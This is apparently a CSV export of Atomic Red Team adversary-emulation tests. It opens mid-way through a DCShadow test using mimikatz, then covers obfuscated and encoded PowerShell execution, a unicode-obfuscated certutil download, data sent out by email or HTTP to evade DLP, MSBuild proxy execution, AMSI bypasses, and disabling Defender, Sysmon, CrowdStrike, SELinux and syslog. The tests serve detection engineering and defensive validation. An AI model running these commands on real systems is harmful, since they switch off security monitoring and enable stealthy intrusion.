Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host ""End of DCShadow""
",powershell,True,,"Stop-Process -Name ""mimikatz"" -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

dependencies.1.description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})

dependencies.1.prereq_command: if (Test-Path ""#{psexec_path}"") { exit 0} else { exit 1}

dependencies.1.get_prereq_command: Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
New-Item -ItemType Directory (Split-Path ""#{psexec_path}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""#{psexec_path}"" -Force

","input_arguments.object.description: Targeted object (for machine account do not forget to add final '$')

input_arguments.object.type: string

input_arguments.object.default: bruce.wayne

input_arguments.attribute.description: Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...

input_arguments.attribute.type: string

input_arguments.attribute.default: badpwdcount

input_arguments.value.description: Value to assign to object attribute

input_arguments.value.type: string

input_arguments.value.default: 9999

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

input_arguments.psexec_path.description: Path to PsExec

input_arguments.psexec_path.type: path

input_arguments.psexec_path.default: PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe

"
T1027,Obfuscated Files or Information,Decode base64 Data into Script,f45df6be-2e1e-4136-a384-8f18ab3826fb,"Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
and uname -v
",macos,linux,,"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;
cat /tmp/encoded.dat | $cmd > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
",sh,,,"rm /tmp/encoded.dat 
rm /tmp/art.sh
",sh,"dependencies.0.description: encode the command into base64 file

dependencies.0.prereq_command: if [ -e ""/tmp/encoded.dat"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64encode -r -""; else cmd=""base64""; fi;
echo ""#{shell_command}"" | $cmd > /tmp/encoded.dat

","input_arguments.shell_command.description: command to encode

input_arguments.shell_command.type: string

input_arguments.shell_command.default: echo Hello from the Atomic Red Team && uname -v

"
T1027,Obfuscated Files or Information,Execute base64-encoded PowerShell,a50d5a97-2531-499e-a1de-5544c74432c6,"Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.

Upon successful execution, powershell will execute an encoded command and stdout default is ""Write-Host ""Hey, Atomic!""
",windows,,,"$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
",powershell,,,,,,"input_arguments.powershell_command.description: PowerShell command to encode

input_arguments.powershell_command.type: string

input_arguments.powershell_command.default: Write-Host ""Hey, Atomic!""

"
T1027,Obfuscated Files or Information,Execute base64-encoded PowerShell from Windows Registry,450e7218-7915-4be4-8b9b-464a49eafcec,"Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.

Upon successful execution, powershell will execute encoded command and read/write from the registry.
",windows,,,"$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))""
",powershell,,,"Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}
",,,"input_arguments.registry_key_storage.description: Windows Registry Key to store code

input_arguments.registry_key_storage.type: string

input_arguments.registry_key_storage.default: HKCU:Software\Microsoft\Windows\CurrentVersion

input_arguments.powershell_command.description: PowerShell command to encode

input_arguments.powershell_command.type: string

input_arguments.powershell_command.default: Write-Host ""Hey, Atomic!""

input_arguments.registry_entry_storage.description: Windows Registry entry to store code under key

input_arguments.registry_entry_storage.type: string

input_arguments.registry_entry_storage.default: Debug

"
T1027,Obfuscated Files or Information,Execution from Compressed File,f8c8a909-5f29-49ac-9244-413936ce6d1f,"Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe""
",command_prompt,,,"taskkill /f /im calculator.exe >nul 2>nul
taskkill /f /im CalculatorApp.exe >nul 2>nul
",powershell,"dependencies.0.description: T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""#{url_path}"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\T1027.zip""
Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\T1027.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\"" -Force

","input_arguments.url_path.description: url to download Exe

input_arguments.url_path.type: url

input_arguments.url_path.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip

"
T1027,Obfuscated Files or Information,DLP Evasion via Sensitive Data in VBA Macro over email,129edb75-d7b8-42cd-a8ba-1f3db64ec4ad,"Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
",windows,,,"Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments ""#{input_file}"" -SmtpServer #{smtp_server}
",powershell,,,,,,"input_arguments.input_file.description: Path of the XLSM file

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm

input_arguments.sender.description: sender email

input_arguments.sender.type: string

input_arguments.sender.default: test@corp.com

input_arguments.receiver.description: receiver email

input_arguments.receiver.type: string

input_arguments.receiver.default: test@corp.com

input_arguments.smtp_server.description: SMTP Server IP Address

input_arguments.smtp_server.type: string

input_arguments.smtp_server.default: 127.0.0.1

"
T1027,Obfuscated Files or Information,DLP Evasion via Sensitive Data in VBA Macro over HTTP,e2d85e66-cb66-4ed7-93b1-833fc56c9319,"Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
",windows,,,"Invoke-WebRequest -Uri #{ip_address} -Method POST -Body ""#{input_file}""
",powershell,,,,,,"input_arguments.input_file.description: Path of the XLSM file

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm

input_arguments.ip_address.description: Destination IP address

input_arguments.ip_address.type: string

input_arguments.ip_address.default: 127.0.0.1

"
T1027,Obfuscated Files or Information,Obfuscated Command in PowerShell,8b3f4ed6-077b-4bdd-891c-2d237f19410f,"This is an obfuscated PowerShell command which when executed prints ""Hello, from PowerShell!"". Example is from the 2021 Threat Detection Report by Red Canary.
",windows,,,"$cmDwhy =[TyPe](""{0}{1}"" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](""{1}{0}{2}""-f'nv','cO','ert')  ;  &(""{0}{2}{3}{1}{4}"" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(""{1}{2}{0}""-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).""v`ALUe""::(""{1}{0}"" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::""t`OinT`16""(( [sTring]${_}) ,8)))})) )
",powershell,,,,,,
T1027,Obfuscated Files or Information,Obfuscated Command Line using special Unicode characters,e68b945c-52d0-4dd9-a5e8-d173d70c448f,"This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).
Reference:
https://wietze.github.io/blog/windows-command-line-obfuscation
",windows,,,,manual,,"1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.


  certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −""൏ᶠ൸"" #{remote_file} #{local_path}


2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.
",,,,"input_arguments.remote_file.description: URL of file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.local_path.description: Local path/filename to save the downloaded file to

input_arguments.local_path.type: path

input_arguments.local_path.default: Atomic-license.txt

"
T1027,Obfuscated Files or Information,Snake Malware Encrypted crmlog file,7e47ee60-9dd1-4269-9c4f-97953b183268,"The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.
[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  
",windows,,,"$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host ""File created: $($file.FullName)""
",powershell,True,,"$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = ""$env:windir\registration\""; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host ""File deleted: $fullPathToDelete"" } else { Write-Host ""File not found: $fullPathToDelete"" }
",,,
T1027,Obfuscated Files or Information,Execution from Compressed JScript File,fad04df1-5229-4185-b016-fb6010cd87ac,"Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""
",command_prompt,,,"taskkill /f /im calculator.exe >nul 2>nul
",powershell,"dependencies.0.description: T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest ""#{url_path}"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip""
Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\"" -Force

","input_arguments.url_path.description: url to download JScript file

input_arguments.url_path.type: url

input_arguments.url_path.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip

"
T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,MSBuild Bypass Using Inline Tasks (C#),58742c0f-cb01-44cd-a60b-fb26e8871c93,"Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print ""Hello From a Code Fragment"" and ""Hello From a Class."" to the screen.
",windows,,,"#{msbuildpath}\#{msbuildname} ""#{filename}""
",command_prompt,,,,powershell,"dependencies.0.description: Project file must exist on disk at specified location (#{filename})

dependencies.0.prereq_command: if (Test-Path ""#{filename}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{filename}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj"" -OutFile ""#{filename}""

","input_arguments.filename.description: Location of the project file

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1127.001\src\T1127.001.csproj

input_arguments.msbuildpath.description: Default location of MSBuild

input_arguments.msbuildpath.type: path

input_arguments.msbuildpath.default: C:\Windows\Microsoft.NET\Framework\v4.0.30319

input_arguments.msbuildname.description: Default name of MSBuild

input_arguments.msbuildname.type: path

input_arguments.msbuildname.default: msbuild.exe

"
T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,MSBuild Bypass Using Inline Tasks (VB),ab042179-c0c5-402f-9bc8-42741f5ce359,"Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print ""Hello from a Visual Basic inline task!"" to the screen.
",windows,,,"#{msbuildpath}\#{msbuildname} ""#{filename}""
",command_prompt,,,,powershell,"dependencies.0.description: Project file must exist on disk at specified location (#{filename})

dependencies.0.prereq_command: if (Test-Path ""#{filename}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{filename}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml"" -OutFile ""#{filename}""

","input_arguments.filename.description: Location of the project file

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1127.001\src\vb.xml

input_arguments.msbuildpath.description: Default location of MSBuild

input_arguments.msbuildpath.type: path

input_arguments.msbuildpath.default: C:\Windows\Microsoft.NET\Framework\v4.0.30319

input_arguments.msbuildname.description: Default name of MSBuild

input_arguments.msbuildname.type: path

input_arguments.msbuildname.default: msbuild.exe

"
T1547,Boot or Logon Autostart Execution,Add a driver,cb01b3da-b0e7-4e24-bf6d-de5223526785,"Install a driver via pnputil.exe lolbin
",windows,,,"pnputil.exe /add-driver ""#{driver_inf}""
",command_prompt,,,,,,"input_arguments.driver_inf.description: A built-in, already installed windows driver inf

input_arguments.driver_inf.type: path

input_arguments.driver_inf.default: C:\Windows\INF\usbstor.inf

"
T1562.001,Impair Defenses: Disable or Modify Tools,Disable syslog,4ce786f8-e601-44b5-bfae-9ebb15a7d1c8,"Disables syslog collection
",linux,,,"#{flavor_command}
",sh,True,,"#{cleanup_command}
",sh,"dependencies.0.description: Package with rsyslog must be on system

dependencies.0.prereq_command: if #{package_checker} > /dev/null; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: sudo #{package_installer} 

","input_arguments.package_checker.description: Package checking command for linux.

input_arguments.package_checker.type: string

input_arguments.package_checker.default: (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)

input_arguments.package_installer.description: Package installer command for linux. Default yum

input_arguments.package_installer.type: string

input_arguments.package_installer.default: (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)

input_arguments.flavor_command.description: Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog

input_arguments.flavor_command.type: string

input_arguments.flavor_command.default: systemctl stop rsyslog ; systemctl disable rsyslog

input_arguments.cleanup_command.description: Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on

input_arguments.cleanup_command.type: string

input_arguments.cleanup_command.default: systemctl start rsyslog ; systemctl enable rsyslog

"
T1562.001,Impair Defenses: Disable or Modify Tools,Disable syslog (freebsd),db9de996-441e-4ae0-947b-61b6871e2fdf,"Disables syslog collection
",linux,,,"service syslogd stop
sysrc syslogd_enable=""NO""
",sh,True,,"sysrc syslogd_enable=""YES""
service syslogd start
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Cb Response,ae8943f7-0f8d-44de-962d-fbc2e2f03eb8,"Disable the Cb Response service
",linux,,,"if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""6"" ];
then
  service cbdaemon stop
  chkconfig off cbdaemon
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""7"" ];
  systemctl stop cbdaemon
  systemctl disable cbdaemon
fi
",sh,,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable SELinux,fc225f36-9279-4c39-b3f9-5141ab74f8d8,"Disables SELinux enforcement
",linux,,,"setenforce 0
",sh,True,,"setenforce 1
",,"dependencies.0.description: SELinux must be installed

dependencies.0.prereq_command: which setenforce

dependencies.0.get_prereq_command: echo ""SELinux is not installed""; exit 1

",
T1562.001,Impair Defenses: Disable or Modify Tools,Stop Crowdstrike Falcon on Linux,828a1278-81cc-4802-96ab-188bf29ca77d,"Stop and disable Crowdstrike Falcon on Linux
",linux,,,"sudo systemctl stop falcon-sensor.service
sudo systemctl disable falcon-sensor.service
",sh,True,,"sudo systemctl enable falcon-sensor.service
sudo systemctl start falcon-sensor.service
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Carbon Black Response,8fba7766-2d11-4b4a-979a-1e3d9cc9a88c,"Disables Carbon Black Response
",macos,,,"sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
",sh,True,,"sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable LittleSnitch,62155dd8-bb3d-4f32-b31c-6532ff3ac6a3,"Disables LittleSnitch
",macos,,,"sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
",sh,True,,"sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable OpenDNS Umbrella,07f43b33-1e15-4e99-be70-bc094157c849,"Disables OpenDNS Umbrella
",macos,,,"sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
",sh,True,,"sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable macOS Gatekeeper,2a821573-fb3f-4e71-92c3-daac7432f053,"Disables macOS Gatekeeper
",macos,,,"sudo spctl --master-disable
",sh,True,,"sudo spctl --master-enable
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Stop and unload Crowdstrike Falcon on macOS,b3e7510c-2d4c-4249-a33f-591a2bc83eef,"Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS
",macos,,,"sudo launchctl unload #{falcond_plist}
sudo launchctl unload #{userdaemon_plist}
",sh,True,,"sudo launchctl load -w #{falcond_plist}
sudo launchctl load -w #{userdaemon_plist}
",,,"input_arguments.falcond_plist.description: The path of the Crowdstrike Falcon plist file

input_arguments.falcond_plist.type: path

input_arguments.falcond_plist.default: /Library/LaunchDaemons/com.crowdstrike.falcond.plist

input_arguments.userdaemon_plist.description: The path of the Crowdstrike Userdaemon plist file

input_arguments.userdaemon_plist.type: path

input_arguments.userdaemon_plist.default: /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist

"
T1562.001,Impair Defenses: Disable or Modify Tools,Unload Sysmon Filter Driver,811b3e76-c41b-430c-ac0d-e2380bfaa164,"Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
run the prereq_command's and it should fail with an error of ""sysmon filter must be loaded"".
",windows,,,"fltmc.exe unload #{sysmon_driver}
",command_prompt,True,,"sysmon -u -i > nul 2>&1
sysmon -i -accepteula -i > nul 2>&1
""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -u > nul 2>&1
""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i > nul 2>&1
",powershell,"dependencies.0.description: Sysmon must be downloaded

dependencies.0.prereq_command: if (-not (cmd.exe /c ""where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul"") -or (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"")) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Sysmon.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon"" -Force

dependencies.1.description: sysmon must be Installed

dependencies.1.prereq_command: if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }

dependencies.1.get_prereq_command: if(cmd.exe /c ""where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul"") { C:\Windows\Sysmon.exe -accepteula -i } else
{ & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i}

dependencies.2.description: sysmon filter must be loaded

dependencies.2.prereq_command: if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }

dependencies.2.get_prereq_command: if(Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe""){
  & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -u
  & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i
}else{
  sysmon -u
  sysmon -accepteula -i
}

","input_arguments.sysmon_driver.description: The name of the Sysmon filter driver (this can change from the default)

input_arguments.sysmon_driver.type: string

input_arguments.sysmon_driver.default: SysmonDrv

"
T1562.001,Impair Defenses: Disable or Modify Tools,Uninstall Sysmon,a316fb2e-5344-470d-91c1-23e15c374edc,"Uninstall Sysinternals Sysmon for Defense Evasion
",windows,,,"sysmon -u
",command_prompt,True,,"sysmon -i -accepteula >nul 2>&1
",powershell,"dependencies.0.description: Sysmon executable must be available

dependencies.0.prereq_command: if(cmd /c where sysmon) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: $parentpath = Split-Path ""#{sysmon_exe}""; $zippath = ""$parentpath\Sysmon.zip""
New-Item -ItemType Directory $parentpath -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Sysmon.zip"" -OutFile ""$zippath""
Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
if(-not ($Env:Path).contains($parentpath)){$Env:Path += "";$parentpath""}

dependencies.1.description: Sysmon must be installed

dependencies.1.prereq_command: if(cmd /c sc query sysmon) { exit 0} else { exit 1}

dependencies.1.get_prereq_command: cmd /c sysmon -i -accepteula

","input_arguments.sysmon_exe.description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)

input_arguments.sysmon_exe.type: path

input_arguments.sysmon_exe.default: PathToAtomicsFolder\T1562.001\bin\sysmon.exe

"
T1562.001,Impair Defenses: Disable or Modify Tools,AMSI Bypass - AMSI InitFailed,695eed40-e949-40e5-b306-b4031e4154bd,"Any easy way to bypass AMSI inspection is it patch the dll in memory setting the ""amsiInitFailed"" function to true.
Upon execution, no output is displayed.

https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
",windows,,,"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
",powershell,,,"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,AMSI Bypass - Remove AMSI Provider Reg Key,13f09b91-c953-438e-845b-b585e51cac9b,"With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
Open Registry Editor and navigate to ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\"" to verify that it is gone.
",windows,,,"Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse
",powershell,True,,"New-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers"" -Name ""{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -ErrorAction Ignore | Out-Null
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Arbitrary Security Windows Service,a1230893-56ac-4c81-b644-2108e982f8f5,"With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
To verify that the service has stopped, run ""sc query McAfeeDLPAgentService""
",windows,,,"net.exe stop #{service_name}
sc.exe config #{service_name} start= disabled
",command_prompt,True,,"sc.exe config #{service_name} start= auto >nul 2>&1
net.exe start #{service_name} >nul 2>&1
",,,"input_arguments.service_name.description: The name of the service to stop

input_arguments.service_name.type: string

input_arguments.service_name.default: McAfeeDLPAgentService

"
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender ATP PowerShell,6b8df440-51ec-4d53-bf83-899591c9b5d7,"Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.
",windows,,,"Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableBlockAtFirstSeen 1
",powershell,True,,"Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -DisableBehaviorMonitoring 0
Set-MpPreference -DisableScriptScanning 0
Set-MpPreference -DisableBlockAtFirstSeen 0
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Command Prompt,aa875ed4-8935-47e2-b2c5-6ec00ab220d2,"Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, ""Access Denied""
will be displayed twice and the WinDefend service status will be displayed.
",windows,,,"sc stop WinDefend
sc config WinDefend start=disabled
sc query WinDefend
",command_prompt,True,,"sc start WinDefend >nul 2>&1
sc config WinDefend start=enabled >nul 2>&1
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Registry,1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45,"Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
grayed out and have no info.
",windows,,,"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1
",powershell,True,,"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 0
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Microsoft Office Security Features,6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7,"Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
show any warning before editing the document.


https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
",windows,,,"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel""
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""
